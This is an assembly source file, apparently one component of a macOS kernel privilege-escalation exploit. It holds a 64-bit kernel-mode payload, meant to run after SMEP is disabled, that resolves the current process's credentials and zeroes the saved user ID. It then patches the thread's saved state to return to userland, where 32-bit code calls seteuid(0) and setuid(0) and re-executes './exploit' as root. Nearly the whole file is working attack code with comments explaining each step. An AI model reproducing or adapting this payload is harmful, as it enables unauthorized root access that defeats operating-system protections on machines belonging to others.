; This is the privilege escalation code and it will be run
; after we've disabled SMEP. I'm doing this in assembly because
; the kernel is going to execute this code as 64bit so the privilege
; escalation part has to be 64bit. However our exploit program is 32bit
; and the simplest way to have 64 and 32 bit code in one binary is probably
; writing the 64bit part in assembly and linking it to the 32 bit code.
bits 64
section __TEXT,__text

; Helper to fix relative accesses bc of PIE
getRIP:
    mov rax, [rsp]
    ret

; This is the function we're trying to implement
; void escalatePrivs() {
;     uint32_t *posix_cred = posix_cred_get(proc_ucred(current_proc()));
;     posix_cred[2] = 0x00;   // uid_t	cr_svuid;		/* saved user id */
;     return;
; }
global _escalatePrivs
_escalatePrivs:
    swapgs

    call getRIP
    add rax, _current_proc - $
    mov rax, [rax]

    call rax; current_proc()

    mov rdi, rax
    
    call getRIP
    add rax, _proc_ucred - $
    mov rax, [rax]
    
    call rax; proc_ucred(current_proc())

    mov rdi, rax

    call getRIP
    add rax, _posix_cred_get - $
    mov rax, [rax]

    call rax; posix_cred_get(proc_ucred(current_proc())) \o/

    ; rax contains a pointer to our posix cred stucture at this point
    ;
    ; struct posix_cred {
	; /*
	;  * The credential hash depends on everything from this point on
	;  * (see kauth_cred_get_hashkey)
	;  */
	; uid_t	cr_uid;			/* effective user id */
	; uid_t	cr_ruid;		/* real user id */
	; uid_t	cr_svuid;		/* saved user id */
	; short	cr_ngroups;		/* number of groups in advisory list */
	; gid_t	cr_groups[NGROUPS];	/* advisory group list */
	; gid_t	cr_rgid;		/* real group id */
	; gid_t	cr_svgid;		/* saved group id */
	; uid_t	cr_gmuid;		/* UID for group membership purposes */
	; int	cr_flags;		/* flags on credential */
    ; }
    ;
    ; we want to overwrite the cr_svuid field insead of cr_uid and cr_ruid
    ; to prevent crashing later on. Overwriting the cr_svuid will enable us
    ; to call seteuid(0)&setuid(0) in order for us to get root

    mov dword [rax+0x4+0x4], 0x00;  cr_svuid = 0x00;
    ; we're root !!! But we still need to return back to userland
    ; to be able to make use of our new privileges


    ; The easiest way to return back to userland is probably
    ; just calling _return_to_user, but since we have a 
    ; kind of fucked up thread structure, we'll need to fix that first.

    
    mov r15, qword [gs:0x08]; Get Thread structure
    mov r15, qword [r15+0x428]; thread saved_state

    ; Calculate address of resume_task
    call getRIP
    add rax, resume_task - $

    ; populate our saved_state with sane values
    mov dword [r15+0x48], eax        ; New eip
    mov dword [r15+0x50], 0x00200282 ; New eflags
    mov dword [r15+0x4c], 0x1b       ; New cs
    mov dword [r15+0x54], 0x500      ; New esp
    mov dword [r15+0x58], 0x23       ; New ss

    mov dword [r15+0x1c], 0x23       ; New ds
    mov dword [r15+0x18], 0x23       ; New es
    mov dword [r15+0x14], 0x00       ; New fs
    mov dword [r15+0x10], 0x00       ; New gs

    call getRIP
    add rax, _return_to_user - $
    mov rax, [rax]

    jmp rax

    hlt


bits 32

resume_task:
    ; seteuid(0) + setuid(0)
    mov eax, 183
    xor ebx, ebx
    int 0x80
    mov eax, 23
    xor ebx, ebx
    int 0x80

    ; Exec our own process again, but this time as root ;)
    xor eax, eax
    push eax
    push 0x00000074
    push 0x696f6c70
    push 0x78652f2e
    mov ebx, esp
    push eax
    push eax
    push ebx
    mov al, 0x3b
    push byte 0x2a
    int 0x80


section __DATA,__data

global _current_proc
_current_proc:
    dq 0xfeedface; placeholder

global _posix_cred_get
_posix_cred_get:
    dq 0xfeedface; placeholder
    
global _proc_ucred
_proc_ucred:
    dq 0xfeedface; placeholder

global _return_to_user
_return_to_user:
    dq 0xfeedface; placeholder
